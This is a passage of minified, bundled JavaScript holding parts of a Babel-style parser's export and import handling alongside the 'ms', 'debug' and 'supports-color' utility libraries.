J=this.parseClassPrivateProperty(Q);X.body.push(J),this.classScope.declarePrivateName(this.getPrivateNameSV(J.key),0,J.key.loc.start)}pushClassAccessorProperty(X,Q,J){if(!J&&!Q.computed&&this.nameIsConstructor(Q.key))this.raise(x.ConstructorClassField,Q.key);let Y=this.parseClassAccessorProperty(Q);if(X.body.push(Y),J)this.classScope.declarePrivateName(this.getPrivateNameSV(Y.key),0,Y.key.loc.start)}pushClassMethod(X,Q,J,Y,W,G){X.body.push(this.parseMethod(Q,J,Y,W,G,"ClassMethod",!0))}pushClassPrivateMethod(X,Q,J,Y){let W=this.parseMethod(Q,J,Y,!1,!1,"ClassPrivateMethod",!0);X.body.push(W);let G=W.kind==="get"?W.static?6:2:W.kind==="set"?W.static?5:1:0;this.declareClassPrivateMethodInScope(W,G)}declareClassPrivateMethodInScope(X,Q){this.classScope.declarePrivateName(this.getPrivateNameSV(X.key),Q,X.key.loc.start)}parsePostMemberNameModifiers(X){}parseClassPrivateProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassPrivateProperty")}parseClassProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassProperty")}parseClassAccessorProperty(X){return this.parseInitializer(X),this.semicolon(),this.finishNode(X,"ClassAccessorProperty")}parseInitializer(X){this.scope.enter(592),this.expressionScope.enter(pq()),this.prodParam.enter(0),X.value=this.eat(29)?this.parseMaybeAssignAllowIn():null,this.expressionScope.exit(),this.prodParam.exit(),this.scope.exit()}parseClassId(X,Q,J,Y=8331){if(w0(this.state.type)){if(X.id=this.parseIdentifier(),Q)this.declareNameFromIdentifier(X.id,Y)}else if(J||!Q)X.id=null;else throw this.raise(x.MissingClassName,this.state.startLoc)}parseClassSuper(X){X.superClass=this.eat(81)?this.parseExprSubscripts():null}parseExport(X,Q){let J=this.parseMaybeImportPhase(X,!0),Y=this.maybeParseExportDefaultSpecifier(X,J),W=!Y||this.eat(12),G=W&&this.eatExportStar(X),H=G&&this.maybeParseExportNamespaceSpecifier(X),$=W&&(!H||this.eat(12)),z=Y||G;if(G&&!H){if(Y)this.unexpected();if(Q)throw this.raise(x.UnsupportedDecoratorExport,X);return this.parseExportFrom(X,!0),this.sawUnambiguousESM=!0,this.finishNode(X,"ExportAllDeclaration")}let U=this.maybeParseExportNamedSpecifiers(X);if(Y&&W&&!G&&!U)this.unexpected(null,5);if(H&&$)this.unexpected(null,98);let K;if(z||U){if(K=!1,Q)throw this.raise(x.UnsupportedDecoratorExport,X);this.parseExportFrom(X,z)}else K=this.maybeParseExportDeclaration(X);if(z||U||K){var B;let q=X;if(this.checkExport(q,!0,!1,!!q.source),((B=q.declaration)==null?void 0:B.type)==="ClassDeclaration")this.maybeTakeDecorators(Q,q.declaration,q);else if(Q)throw this.raise(x.UnsupportedDecoratorExport,X);return this.sawUnambiguousESM=!0,this.finishNode(q,"ExportNamedDeclaration")}if(this.eat(65)){let q=X,Z=this.parseExportDefaultExpression();if(q.declaration=Z,Z.type==="ClassDeclaration")this.maybeTakeDecorators(Q,Z,q);else if(Q)throw this.raise(x.UnsupportedDecoratorExport,X);return this.checkExport(q,!0,!0),this.sawUnambiguousESM=!0,this.finishNode(q,"ExportDefaultDeclaration")}this.unexpected(null,5)}eatExportStar(X){return this.eat(55)}maybeParseExportDefaultSpecifier(X,Q){if(Q||this.isExportDefaultSpecifier()){this.expectPlugin("exportDefaultFrom",Q==null?void 0:Q.loc.start);let J=Q||this.parseIdentifier(!0),Y=this.startNodeAtNode(J);return Y.exported=J,X.specifiers=[this.finishNode(Y,"ExportDefaultSpecifier")],!0}return!1}maybeParseExportNamespaceSpecifier(X){if(this.isContextual(93)){var Q,J;(J=(Q=X).specifiers)!=null||(Q.specifiers=[]);let Y=this.startNodeAt(this.state.lastTokStartLoc);return this.next(),Y.exported=this.parseModuleExportName(),X.specifiers.push(this.finishNode(Y,"ExportNamespaceSpecifier")),!0}return!1}maybeParseExportNamedSpecifiers(X){if(this.match(5)){let Q=X;if(!Q.specifiers)Q.specifiers=[];let J=Q.exportKind==="type";if(Q.specifiers.push(...this.parseExportSpecifiers(J)),Q.source=null,this.hasPlugin("importAssertions"))Q.assertions=[];else Q.attributes=[];return Q.declaration=null,!0}return!1}maybeParseExportDeclaration(X){if(this.shouldParseExportDeclaration()){if(X.specifiers=[],X.source=null,this.hasPlugin("importAssertions"))X.assertions=[];else X.attributes=[];return X.declaration=this.parseExportDeclaration(X),!0}return!1}isAsyncFunction(){if(!this.isContextual(95))return!1;let X=this.nextTokenInLineStart();return this.isUnparsedContextual(X,"function")}parseExportDefaultExpression(){let X=this.startNode();if(this.match(68))return this.next(),this.parseFunction(X,5);else if(this.isAsyncFunction())return this.next(),this.next(),this.parseFunction(X,13);if(this.match(80))return this.parseClass(X,!0,!0);if(this.match(26)){if(this.hasPlugin("decorators")&&this.getPluginOption("decorators","decoratorsBeforeExport")===!0)this.raise(x.DecoratorBeforeExport,this.state.startLoc);return this.parseClass(this.maybeTakeDecorators(this.parseDecorators(!1),this.startNode()),!0,!0)}if(this.match(75)||this.match(74)||this.isLet()||this.isUsing()||this.isAwaitUsing())throw this.raise(x.UnsupportedDefaultExport,this.state.startLoc);let Q=this.parseMaybeAssignAllowIn();return this.semicolon(),Q}parseExportDeclaration(X){if(this.match(80))return this.parseClass(this.startNode(),!0,!1);return this.parseStatementListItem()}isExportDefaultSpecifier(){let{type:X}=this.state;if(w0(X)){if(X===95&&!this.state.containsEsc||X===100)return!1;if((X===130||X===129)&&!this.state.containsEsc){let Y=this.nextTokenStart(),W=this.input.charCodeAt(Y);if(W===123||this.chStartsBindingIdentifier(W,Y)&&!this.input.startsWith("from",Y))return this.expectOnePlugin(["flow","typescript"]),!1}}else if(!this.match(65))return!1;let Q=this.nextTokenStart(),J=this.isUnparsedContextual(Q,"from");if(this.input.charCodeAt(Q)===44||w0(this.state.type)&&J)return!0;if(this.match(65)&&J){let Y=this.input.charCodeAt(this.nextTokenStartSince(Q+4));return Y===34||Y===39}return!1}parseExportFrom(X,Q){if(this.eatContextual(98))X.source=this.parseImportSource(),this.checkExport(X),this.maybeParseImportAttributes(X),this.checkJSONModuleImport(X);else if(Q)this.unexpected();this.semicolon()}shouldParseExportDeclaration(){let{type:X}=this.state;if(X===26){if(this.expectOnePlugin(["decorators","decorators-legacy"]),this.hasPlugin("decorators")){if(this.getPluginOption("decorators","decoratorsBeforeExport")===!0)this.raise(x.DecoratorBeforeExport,this.state.startLoc);return!0}}if(this.isUsing())return this.raise(x.UsingDeclarationExport,this.state.startLoc),!0;if(this.isAwaitUsing())return this.raise(x.UsingDeclarationExport,this.state.startLoc),!0;return X===74||X===75||X===68||X===80||this.isLet()||this.isAsyncFunction()}checkExport(X,Q,J,Y){if(Q){var W;if(J){if(this.checkDuplicateExports(X,"default"),this.hasPlugin("exportDefaultFrom")){var G;let H=X.declaration;if(H.type==="Identifier"&&H.name==="from"&&H.end-H.start===4&&!((G=H.extra)!=null&&G.parenthesized))this.raise(x.ExportDefaultFromAsIdentifier,H)}}else if((W=X.specifiers)!=null&&W.length)for(let H of X.specifiers){let{exported:$}=H,z=$.type==="Identifier"?$.name:$.value;if(this.checkDuplicateExports(H,z),!Y&&H.local){let{local:U}=H;if(U.type!=="Identifier")this.raise(x.ExportBindingIsString,H,{localName:U.value,exportName:z});else this.checkReservedWord(U.name,U.loc.start,!0,!1),this.scope.checkLocalExport(U)}}else if(X.declaration){let H=X.declaration;if(H.type==="FunctionDeclaration"||H.type==="ClassDeclaration"){let{id:$}=H;if(!$)throw Error("Assertion failure");this.checkDuplicateExports(X,$.name)}else if(H.type==="VariableDeclaration")for(let $ of H.declarations)this.checkDeclaration($.id)}}}checkDeclaration(X){if(X.type==="Identifier")this.checkDuplicateExports(X,X.name);else if(X.type==="ObjectPattern")for(let Q of X.properties)this.checkDeclaration(Q);else if(X.type==="ArrayPattern"){for(let Q of X.elements)if(Q)this.checkDeclaration(Q)}else if(X.type==="ObjectProperty")this.checkDeclaration(X.value);else if(X.type==="RestElement")this.checkDeclaration(X.argument);else if(X.type==="AssignmentPattern")this.checkDeclaration(X.left)}checkDuplicateExports(X,Q){if(this.exportedIdentifiers.has(Q))if(Q==="default")this.raise(x.DuplicateDefaultExport,X);else this.raise(x.DuplicateExport,X,{exportName:Q});this.exportedIdentifiers.add(Q)}parseExportSpecifiers(X){let Q=[],J=!0;this.expect(5);while(!this.eat(8)){if(J)J=!1;else if(this.expect(12),this.eat(8))break;let Y=this.isContextual(130),W=this.match(134),G=this.startNode();G.local=this.parseModuleExportName(),Q.push(this.parseExportSpecifier(G,W,X,Y))}return Q}parseExportSpecifier(X,Q,J,Y){if(this.eatContextual(93))X.exported=this.parseModuleExportName();else if(Q)X.exported=this.cloneStringLiteral(X.local);else if(!X.exported)X.exported=this.cloneIdentifier(X.local);return this.finishNode(X,"ExportSpecifier")}parseModuleExportName(){if(this.match(134)){let X=this.parseStringLiteral(this.state.value),Q=Xx.exec(X.value);if(Q)this.raise(x.ModuleExportNameHasLoneSurrogate,X,{surrogateCharCode:Q[0].charCodeAt(0)});return X}return this.parseIdentifier(!0)}isJSONModuleImport(X){if(X.assertions!=null)return X.assertions.some(({key:Q,value:J})=>{return J.value==="json"&&(Q.type==="Identifier"?Q.name==="type":Q.value==="type")});return!1}checkImportReflection(X){let{specifiers:Q}=X,J=Q.length===1?Q[0].type:null;if(X.phase==="source"){if(J!=="ImportDefaultSpecifier")this.raise(x.SourcePhaseImportRequiresDefault,Q[0].loc.start)}else if(X.phase==="defer"){if(J!=="ImportNamespaceSpecifier")this.raise(x.DeferImportRequiresNamespace,Q[0].loc.start)}else if(X.module){var Y;if(J!=="ImportDefaultSpecifier")this.raise(x.ImportReflectionNotBinding,Q[0].loc.start);if(((Y=X.assertions)==null?void 0:Y.length)>0)this.raise(x.ImportReflectionHasAssertion,Q[0].loc.start)}}checkJSONModuleImport(X){if(this.isJSONModuleImport(X)&&X.type!=="ExportAllDeclaration"){let{specifiers:Q}=X;if(Q!=null){let J=Q.find((Y)=>{let W;if(Y.type==="ExportSpecifier")W=Y.local;else if(Y.type==="ImportSpecifier")W=Y.imported;if(W!==void 0)return W.type==="Identifier"?W.name!=="default":W.value!=="default"});if(J!==void 0)this.raise(x.ImportJSONBindingNotDefault,J.loc.start)}}}isPotentialImportPhase(X){if(X)return!1;return this.isContextual(105)||this.isContextual(97)||this.isContextual(127)}applyImportPhase(X,Q,J,Y){if(Q)return;if(J==="module")this.expectPlugin("importReflection",Y),X.module=!0;else if(this.hasPlugin("importReflection"))X.module=!1;if(J==="source")this.expectPlugin("sourcePhaseImports",Y),X.phase="source";else if(J==="defer")this.expectPlugin("deferredImportEvaluation",Y),X.phase="defer";else if(this.hasPlugin("sourcePhaseImports"))X.phase=null}parseMaybeImportPhase(X,Q){if(!this.isPotentialImportPhase(Q))return this.applyImportPhase(X,Q,null),null;let J=this.startNode(),Y=this.parseIdentifierName(!0),{type:W}=this.state;if(C6(W)?W!==98||this.lookaheadCharCode()===102:W!==12)return this.applyImportPhase(X,Q,Y,J.loc.start),null;else return this.applyImportPhase(X,Q,null),this.createIdentifier(J,Y)}isPrecedingIdImportPhase(X){let{type:Q}=this.state;return w0(Q)?Q!==98||this.lookaheadCharCode()===102:Q!==12}parseImport(X){if(this.match(134))return this.parseImportSourceAndAttributes(X);return this.parseImportSpecifiersAndAfter(X,this.parseMaybeImportPhase(X,!1))}parseImportSpecifiersAndAfter(X,Q){X.specifiers=[];let Y=!this.maybeParseDefaultImportSpecifier(X,Q)||this.eat(12),W=Y&&this.maybeParseStarImportSpecifier(X);if(Y&&!W)this.parseNamedImportSpecifiers(X);return this.expectContextual(98),this.parseImportSourceAndAttributes(X)}parseImportSourceAndAttributes(X){var Q;return(Q=X.specifiers)!=null||(X.specifiers=[]),X.source=this.parseImportSource(),this.maybeParseImportAttributes(X),this.checkImportReflection(X),this.checkJSONModuleImport(X),this.semicolon(),this.sawUnambiguousESM=!0,this.finishNode(X,"ImportDeclaration")}parseImportSource(){if(!this.match(134))this.unexpected();return this.parseExprAtom()}parseImportSpecifierLocal(X,Q,J){Q.local=this.parseIdentifier(),X.specifiers.push(this.finishImportSpecifier(Q,J))}finishImportSpecifier(X,Q,J=8201){return this.checkLVal(X.local,{type:Q},J),this.finishNode(X,Q)}parseImportAttributes(){this.expect(5);let X=[],Q=new Set;do{if(this.match(8))break;let J=this.startNode(),Y=this.state.value;if(Q.has(Y))this.raise(x.ModuleAttributesWithDuplicateKeys,this.state.startLoc,{key:Y});if(Q.add(Y),this.match(134))J.key=this.parseStringLiteral(Y);else J.key=this.parseIdentifier(!0);if(this.expect(14),!this.match(134))throw this.raise(x.ModuleAttributeInvalidValue,this.state.startLoc);J.value=this.parseStringLiteral(this.state.value),X.push(this.finishNode(J,"ImportAttribute"))}while(this.eat(12));return this.expect(8),X}parseModuleAttributes(){let X=[],Q=new Set;do{let J=this.startNode();if(J.key=this.parseIdentifier(!0),J.key.name!=="type")this.raise(x.ModuleAttributeDifferentFromType,J.key);if(Q.has(J.key.name))this.raise(x.ModuleAttributesWithDuplicateKeys,J.key,{key:J.key.name});if(Q.add(J.key.name),this.expect(14),!this.match(134))throw this.raise(x.ModuleAttributeInvalidValue,this.state.startLoc);J.value=this.parseStringLiteral(this.state.value),X.push(this.finishNode(J,"ImportAttribute"))}while(this.eat(12));return X}maybeParseImportAttributes(X){let Q;var J=!1;if(this.match(76)){if(this.hasPrecedingLineBreak()&&this.lookaheadCharCode()===40)return;if(this.next(),this.hasPlugin("moduleAttributes"))Q=this.parseModuleAttributes(),this.addExtra(X,"deprecatedWithLegacySyntax",!0);else Q=this.parseImportAttributes();J=!0}else if(this.isContextual(94)&&!this.hasPrecedingLineBreak()){if(!this.hasPlugin("deprecatedImportAssert")&&!this.hasPlugin("importAssertions"))this.raise(x.ImportAttributesUseAssert,this.state.startLoc);if(!this.hasPlugin("importAssertions"))this.addExtra(X,"deprecatedAssertSyntax",!0);this.next(),Q=this.parseImportAttributes()}else Q=[];if(!J&&this.hasPlugin("importAssertions"))X.assertions=Q;else X.attributes=Q}maybeParseDefaultImportSpecifier(X,Q){if(Q){let J=this.startNodeAtNode(Q);return J.local=Q,X.specifiers.push(this.finishImportSpecifier(J,"ImportDefaultSpecifier")),!0}else if(C6(this.state.type))return this.parseImportSpecifierLocal(X,this.startNode(),"ImportDefaultSpecifier"),!0;return!1}maybeParseStarImportSpecifier(X){if(this.match(55)){let Q=this.startNode();return this.next(),this.expectContextual(93),this.parseImportSpecifierLocal(X,Q,"ImportNamespaceSpecifier"),!0}return!1}parseNamedImportSpecifiers(X){let Q=!0;this.expect(5);while(!this.eat(8)){if(Q)Q=!1;else{if(this.eat(14))throw this.raise(x.DestructureNamedImport,this.state.startLoc);if(this.expect(12),this.eat(8))break}let J=this.startNode(),Y=this.match(134),W=this.isContextual(130);J.imported=this.parseModuleExportName();let G=this.parseImportSpecifier(J,Y,X.importKind==="type"||X.importKind==="typeof",W,void 0);X.specifiers.push(G)}}parseImportSpecifier(X,Q,J,Y,W){if(this.eatContextual(93))X.local=this.parseIdentifier();else{let{imported:G}=X;if(Q)throw this.raise(x.ImportBindingIsString,X,{importName:G.value});if(this.checkReservedWord(G.name,X.loc.start,!0,!0),!X.local)X.local=this.cloneIdentifier(G)}return this.finishImportSpecifier(X,"ImportSpecifier",W)}isThisParam(X){return X.type==="Identifier"&&X.name==="this"}}class xH extends eq{constructor(X,Q,J){X=eb(X);super(X,Q);this.options=X,this.initializeScopes(),this.plugins=J,this.filename=X.sourceFilename,this.startIndex=X.startIndex;let Y=0;if(X.allowAwaitOutsideFunction)Y|=1;if(X.allowReturnOutsideFunction)Y|=2;if(X.allowImportExportEverywhere)Y|=8;if(X.allowSuperOutsideMethod)Y|=16;if(X.allowUndeclaredExports)Y|=64;if(X.allowNewTargetOutsideFunction)Y|=4;if(X.allowYieldOutsideFunction)Y|=32;if(X.ranges)Y|=128;if(X.tokens)Y|=256;if(X.createImportExpressions)Y|=512;if(X.createParenthesizedExpressions)Y|=1024;if(X.errorRecovery)Y|=2048;if(X.attachComment)Y|=4096;if(X.annexB)Y|=8192;this.optionFlags=Y}getScopeHandler(){return sJ}parse(){this.enterInitialScopes();let X=this.startNode(),Q=this.startNode();return this.nextToken(),X.errors=null,this.parseTopLevel(X,Q),X.errors=this.state.errors,X.comments.length=this.state.commentsLen,X}}function Jx(X,Q){var J;if(((J=Q)==null?void 0:J.sourceType)==="unambiguous"){Q=Object.assign({},Q);try{Q.sourceType="module";let Y=P4(Q,X),W=Y.parse();if(Y.sawUnambiguousESM)return W;if(Y.ambiguousScriptDifferentAst)try{return Q.sourceType="script",P4(Q,X).parse()}catch(G){}else W.program.sourceType="script";return W}catch(Y){try{return Q.sourceType="script",P4(Q,X).parse()}catch(W){}throw Y}}else return P4(Q,X).parse()}function Yx(X,Q){let J=P4(Q,X);if(J.options.strictMode)J.state.strict=!0;return J.getExpression()}function Wx(X){let Q={};for(let J of Object.keys(X))Q[J]=D8(X[J]);return Q}var Gx=Wx(Yv);function P4(X,Q){let J=xH,Y=new Map;if(X!=null&&X.plugins){for(let W of X.plugins){let G,H;if(typeof W==="string")G=W;else[G,H]=W;if(!Y.has(G))Y.set(G,H||{})}sv(Y),J=Hx(Y)}return new J(X,Q,Y)}var Dq=new Map;function Hx(X){let Q=[];for(let W of tv)if(X.has(W))Q.push(W);let J=Q.join("|"),Y=Dq.get(J);if(!Y){Y=xH;for(let W of Q)Y=sq[W](Y);Dq.set(J,Y)}return Y}XZ.parse=Jx;XZ.parseExpression=Yx;XZ.tokTypes=Gx});var fH=m((QZ)=>{Object.defineProperty(QZ,"__esModule",{value:!0});QZ.Var=QZ.User=QZ.Statement=QZ.SpreadProperty=QZ.Scope=QZ.RestProperty=QZ.ReferencedMemberExpression=QZ.ReferencedIdentifier=QZ.Referenced=QZ.Pure=QZ.NumericLiteralTypeAnnotation=QZ.Generated=QZ.ForAwaitStatement=QZ.Flow=QZ.Expression=QZ.ExistentialTypeParam=QZ.BlockScoped=QZ.BindingIdentifier=void 0;var k90=QZ.ReferencedIdentifier=["Identifier","JSXIdentifier"],b90=QZ.ReferencedMemberExpression=["MemberExpression"],v90=QZ.BindingIdentifier=["Identifier"],x90=QZ.Statement=["Statement"],f90=QZ.Expression=["Expression"],h90=QZ.Scope=["Scopable","Pattern"],y90=QZ.Referenced=null,g90=QZ.BlockScoped=null,m90=QZ.Var=["VariableDeclaration"],u90=QZ.User=null,c90=QZ.Generated=null,l90=QZ.Pure=null,p90=QZ.Flow=["Flow","ImportDeclaration","ExportDeclaration","ImportSpecifier"],d90=QZ.RestProperty=["RestElement"],i90=QZ.SpreadProperty=["RestElement"],r90=QZ.ExistentialTypeParam=["ExistsTypeAnnotation"],n90=QZ.NumericLiteralTypeAnnotation=["NumberLiteralTypeAnnotation"],a90=QZ.ForAwaitStatement=["ForOfStatement"]});var WZ=m((s90,YZ)=>{var J5=1000,Y5=J5*60,W5=Y5*60,dX=W5*24,Px=dX*7,Sx=dX*365.25;YZ.exports=function(X,Q){Q=Q||{};var J=typeof X;if(J==="string"&&X.length>0)return Ex(X);else if(J==="number"&&isFinite(X))return Q.long?_x(X):Tx(X);throw Error("val is not a non-empty string or a valid number. val="+JSON.stringify(X))};function Ex(X){if(X=String(X),X.length>100)return;var Q=/^(-?(?:\d+)?\.?\d+) *(milliseconds?|msecs?|ms|seconds?|secs?|s|minutes?|mins?|m|hours?|hrs?|h|days?|d|weeks?|w|years?|yrs?|y)?$/i.exec(X);if(!Q)return;var J=parseFloat(Q[1]),Y=(Q[2]||"ms").toLowerCase();switch(Y){case"years":case"year":case"yrs":case"yr":case"y":return J*Sx;case"weeks":case"week":case"w":return J*Px;case"days":case"day":case"d":return J*dX;case"hours":case"hour":case"hrs":case"hr":case"h":return J*W5;case"minutes":case"minute":case"mins":case"min":case"m":return J*Y5;case"seconds":case"second":case"secs":case"sec":case"s":return J*J5;case"milliseconds":case"millisecond":case"msecs":case"msec":case"ms":return J;default:return}}function Tx(X){var Q=Math.abs(X);if(Q>=dX)return Math.round(X/dX)+"d";if(Q>=W5)return Math.round(X/W5)+"h";if(Q>=Y5)return Math.round(X/Y5)+"m";if(Q>=J5)return Math.round(X/J5)+"s";return X+"ms"}function _x(X){var Q=Math.abs(X);if(Q>=dX)return eJ(X,Q,dX,"day");if(Q>=W5)return eJ(X,Q,W5,"hour");if(Q>=Y5)return eJ(X,Q,Y5,"minute");if(Q>=J5)return eJ(X,Q,J5,"second");return X+" ms"}function eJ(X,Q,J,Y){var W=Q>=J*1.5;return Math.round(X/J)+" "+Y+(W?"s":"")}});var hH=m((t90,GZ)=>{function kx(X){J.debug=J,J.default=J,J.coerce=z,J.disable=H,J.enable=W,J.enabled=$,J.humanize=WZ(),J.destroy=U,Object.keys(X).forEach((K)=>{J[K]=X[K]}),J.names=[],J.skips=[],J.formatters={};function Q(K){let B=0;for(let q=0;q<K.length;q++)B=(B<<5)-B+K.charCodeAt(q),B|=0;return J.colors[Math.abs(B)%J.colors.length]}J.selectColor=Q;function J(K){let B,q=null,Z,M;function L(...R){if(!L.enabled)return;let j=L,F=Number(new Date),A=F-(B||F);if(j.diff=A,j.prev=B,j.curr=F,B=F,R[0]=J.coerce(R[0]),typeof R[0]!=="string")R.unshift("%O");let O=0;R[0]=R[0].replace(/%([a-zA-Z%])/g,(N,C)=>{if(N==="%%")return"%";O++;let _=J.formatters[C];if(typeof _==="function"){let h=R[O];N=_.call(j,h),R.splice(O,1),O--}return N}),J.formatArgs.call(j,R),(j.log||J.log).apply(j,R)}if(L.namespace=K,L.useColors=J.useColors(),L.color=J.selectColor(K),L.extend=Y,L.destroy=J.destroy,Object.defineProperty(L,"enabled",{enumerable:!0,configurable:!1,get:()=>{if(q!==null)return q;if(Z!==J.namespaces)Z=J.namespaces,M=J.enabled(K);return M},set:(R)=>{q=R}}),typeof J.init==="function")J.init(L);return L}function Y(K,B){let q=J(this.namespace+(typeof B>"u"?":":B)+K);return q.log=this.log,q}function W(K){J.save(K),J.namespaces=K,J.names=[],J.skips=[];let B=(typeof K==="string"?K:"").trim().replace(/\s+/g,",").split(",").filter(Boolean);for(let q of B)if(q[0]==="-")J.skips.push(q.slice(1));else J.names.push(q)}function G(K,B){let q=0,Z=0,M=-1,L=0;while(q<K.length)if(Z<B.length&&(B[Z]===K[q]||B[Z]==="*"))if(B[Z]==="*")M=Z,L=q,Z++;else q++,Z++;else if(M!==-1)Z=M+1,L++,q=L;else return!1;while(Z<B.length&&B[Z]==="*")Z++;return Z===B.length}function H(){let K=[...J.names,...J.skips.map((B)=>"-"+B)].join(",");return J.enable(""),K}function $(K){for(let B of J.skips)if(G(K,B))return!1;for(let B of J.names)if(G(K,B))return!0;return!1}function z(K){if(K instanceof Error)return K.stack||K.message;return K}function U(){console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")}return J.enable(J.load()),J}GZ.exports=kx});var $Z=m((HZ,XY)=>{HZ.formatArgs=vx;HZ.save=xx;HZ.load=fx;HZ.useColors=bx;HZ.storage=hx();HZ.destroy=(()=>{let X=!1;return()=>{if(!X)X=!0,console.warn("Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.")}})();HZ.colors=["#0000CC","#0000FF","#0033CC","#0033FF","#0066CC","#0066FF","#0099CC","#0099FF","#00CC00","#00CC33","#00CC66","#00CC99","#00CCCC","#00CCFF","#3300CC","#3300FF","#3333CC","#3333FF","#3366CC","#3366FF","#3399CC","#3399FF","#33CC00","#33CC33","#33CC66","#33CC99","#33CCCC","#33CCFF","#6600CC","#6600FF","#6633CC","#6633FF","#66CC00","#66CC33","#9900CC","#9900FF","#9933CC","#9933FF","#99CC00","#99CC33","#CC0000","#CC0033","#CC0066","#CC0099","#CC00CC","#CC00FF","#CC3300","#CC3333","#CC3366","#CC3399","#CC33CC","#CC33FF","#CC6600","#CC6633","#CC9900","#CC9933","#CCCC00","#CCCC33","#FF0000","#FF0033","#FF0066","#FF0099","#FF00CC","#FF00FF","#FF3300","#FF3333","#FF3366","#FF3399","#FF33CC","#FF33FF","#FF6600","#FF6633","#FF9900","#FF9933","#FFCC00","#FFCC33"];function bx(){if(typeof window<"u"&&window.process&&(window.process.type==="renderer"||window.process.__nwjs))return!0;if(typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().match(/(edge|trident)\/(\d+)/))return!1;let X;return typeof document<"u"&&document.documentElement&&document.documentElement.style&&document.documentElement.style.WebkitAppearance||typeof window<"u"&&window.console&&(window.console.firebug||window.console.exception&&window.console.table)||typeof navigator<"u"&&navigator.userAgent&&(X=navigator.userAgent.toLowerCase().match(/firefox\/(\d+)/))&&parseInt(X[1],10)>=31||typeof navigator<"u"&&navigator.userAgent&&navigator.userAgent.toLowerCase().match(/applewebkit\/(\d+)/)}function vx(X){if(X[0]=(this.useColors?"%c":"")+this.namespace+(this.useColors?" %c":" ")+X[0]+(this.useColors?"%c ":" ")+"+"+XY.exports.humanize(this.diff),!this.useColors)return;let Q="color: "+this.color;X.splice(1,0,Q,"color: inherit");let J=0,Y=0;X[0].replace(/%[a-zA-Z%]/g,(W)=>{if(W==="%%")return;if(J++,W==="%c")Y=J}),X.splice(Y,0,Q)}HZ.log=console.debug||console.log||(()=>{});function xx(X){try{if(X)HZ.storage.setItem("debug",X);else HZ.storage.removeItem("debug")}catch(Q){}}function fx(){let X;try{X=HZ.storage.getItem("debug")||HZ.storage.getItem("DEBUG")}catch(Q){}if(!X&&typeof process<"u"&&"env"in process)X=process.env.DEBUG;return X}function hx(){try{return localStorage}catch(X){}}XY.exports=hH()(HZ);var{formatters:yx}=XY.exports;yx.j=function(X){try{return JSON.stringify(X)}catch(Q){return"[UnexpectedJSONParseError]: "+Q.message}}});var UZ=m((X60,zZ)=>{zZ.exports=(X,Q=process.argv)=>{let J=X.startsWith("-")?"":X.length===1?"-":"--",Y=Q.indexOf(J+X),W=Q.indexOf("--");return Y!==-1&&(W===-1||Y<W)}});var BZ=m((Q60,VZ)=>{var ix=O0("os"),KZ=O0("tty"),W6=UZ(),{env:$9}=process,BX;if(W6("no-color")||W6("no-colors")||W6("color=false")||W6("color=never"))BX=0;else if(W6("color")||W6("colors")||W6("color=true")||W6("color=always"))BX=1;if("FORCE_COLOR"in $9)if($9.FORCE_COLOR==="true")BX=1;else if($9.FORCE_COLOR==="false")BX=0;else BX=$9.FORCE_COLOR.length===0?1:Math.min(parseInt($9.FORCE_COLOR,10),3);function yH(X){if(X===0)return!1;return{level:X,hasBasic:!0,has256:X>=2,has16m:X>=3}}function gH(X,Q){if(BX===0)return 0;if(W6("color=16m")||W6("color=full")||W6("color=truecolor"))return 3;if(W6("color=256"))return 2;if(X&&!Q&&BX===void 0)return 0;let J=BX||0;if($9.TERM==="dumb")return J;if(process.platform==="win32"){let Y=ix.release().split(".");if(Number(Y[0])>=10&&Number(Y[2])>=10586)return Number(Y[2])>=14931?3:2;return 1}if("CI"in $9){if(["TRAVIS","CIRCLECI","APPVEYOR","GITLAB_CI","GITHUB_ACTIONS","BUILDKITE"].some((Y)=>(Y in $9))||$9.CI_NAME==="codeship")return 1;return J}if("TEAMCITY_VERSION"in $9)return/^(9\.(0*[1-9]\d*)\.|\d{2,}\.)/.test($9.TEAMCITY_VERSION)?1:0;if($9.COLORTERM==="truecolor")return 3;if("TERM_PROGRAM"in $9){let Y=parseInt(($9.TERM_PROGRAM_VERSION||"").split(".")[0],10);switch($9.TERM_PROGRAM){case"iTerm.app":return Y>=3?3:2;case"Apple_Terminal":return 2}}if(/-256(color)?$/i.test($9.TERM))return 2;if(/^screen|^xterm|^vt100|^vt220|^rxvt|color|ansi|cygwin|linux/i.test($9.TERM))return 1;if("COLORTERM"in $9)return 1;return J}function rx(X){let Q=gH(X,X&&X.isTTY);return yH(Q)}VZ.exports={supportsColor:rx,stdout:yH(gH(!0,KZ.isatty(1))),stderr:yH(gH(!0,KZ.isatty(2)))}});var jZ=m((ZZ,JY)=>{var nx=O0("tty"),QY=O0("util");ZZ.init=Qf;ZZ.log=tx;ZZ.formatArgs=ox;ZZ.save=ex;ZZ.load=Xf;ZZ.useColors=ax;ZZ.destroy=QY.deprecate(()=>{},"Instance method `debug.destroy()` is deprecated and no longer does anything. It will be removed in the next major version of `debug`.");ZZ.colors=[6,2,3,4,5,1];try{let X=BZ();if(X&&(X.stderr||X).level>=2)ZZ.colors=[20,21,26,27,32,33,38,39,40,41,42,43,44,45,56,57,62,63,68,69,74,75,76,77,78,79,80,81,92,93,98,99,112,113,128,129,134,135,148,149,160,161,162,163,164,165,166,167,168,169,170,171,172,173,178,179,184,185,196,197,198,199,200,201,202,203,204,205,206,207,208,209,214,215,220,221]}catch(X){}ZZ.inspectOpts=Object.keys(process.env).filter((X)=>{return/^debug_/i.test(X)}).reduce((X,Q)=>{let J=Q.substring(6).toLowerCase().replace(/_([a-z])/g,(W,G)=>{return G.toUpperCase()}),Y=process.env[Q];if(/^(yes|on|true|enabled)$/i.test(Y))Y=!0;else if(/^(no|off|false|disabled)$/i.test(Y))Y=!1;else if(Y==="null")Y=null;else Y=Number(Y);return X[J]=Y,X},{});function ax(){return"colors"in ZZ.inspectOpts?Boolean(ZZ.inspectOpts.colors):nx.isatty(process.stderr.fd)}function ox(X){let{namespace:Q,useColors:J}=this;if(J){let Y=this.color,W="\x1B[3"+(Y<8?Y:"8;5;"+Y),G=`  ${W};1m${Q} \x1B[0m`;X[0]=G+X[0].split(`
`).join(`
